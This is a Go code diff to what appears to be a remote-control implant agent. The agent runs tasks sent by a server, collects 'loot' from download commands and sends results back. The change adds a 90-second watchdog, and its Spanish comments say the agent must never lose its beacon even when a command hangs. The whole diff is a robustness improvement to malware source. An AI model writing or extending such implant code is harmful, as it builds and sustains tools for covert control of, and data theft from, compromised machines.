@@ -335,15 +335,41 @@ func saveState(cfg *Config) error {
 }
 
 // runTask executes one task and returns the result.
-func runTask(cfg *Config, client *client, task *taskSpec) {
-	output, errStr, success := execute(cfg, task)
-	if errStr != "" {
-		fmt.Fprintf(os.Stderr, "[!] task %d failed: %s\n", task.ID, errStr)
-	}
-	lootType, lootName, lootData := collectLoot(cfg, task, output)
-	_ = client.sendResult(cfg, task.ID, output, errStr, success, lootType, lootName, lootData)
-}
+// taskWatchdog es el plazo maximo de una orden. Si una orden se queda
+// colgada (un binario del sistema que no responde), el agente NO puede
+// quedarse sin beacon: al vencer el plazo se devuelve un error y el beacon
+// sigue.
+const taskWatchdog = 90 * time.Second
 
+// runTask ejecuta una orden y devuelve su resultado.
+func runTask(cfg *Config, client *client, task *taskSpec) {
+	type outcome struct {
+		out string
+		err string
+		ok  bool
+	}
+	done := make(chan outcome, 1)
+	go func() {
+		out, errMsg, ok := execute(cfg, task)
+		done <- outcome{out, errMsg, ok}
+	}()
+
+	var result outcome
+	select {
+	case result = <-done:
+	case <-time.After(taskWatchdog):
+		result = outcome{
+			out: "",
+			err: fmt.Sprintf("the command exceeded the %s watchdog", taskWatchdog),
+			ok:  false,
+		}
+	}
+	if result.err != "" {
+		fmt.Fprintf(os.Stderr, "[!] task %d failed: %s\n", task.ID, result.err)
+	}
+	lootType, lootName, lootData := collectLoot(cfg, task, result.out)
+	_ = client.sendResult(cfg, task.ID, result.out, result.err, result.ok, lootType, lootName, lootData)
+}
 // collectLoot extracts a binary artifact from a task result.
 func collectLoot(cfg *Config, task *taskSpec, output string) (string, string, string) {
 	if task.Command != "download" {
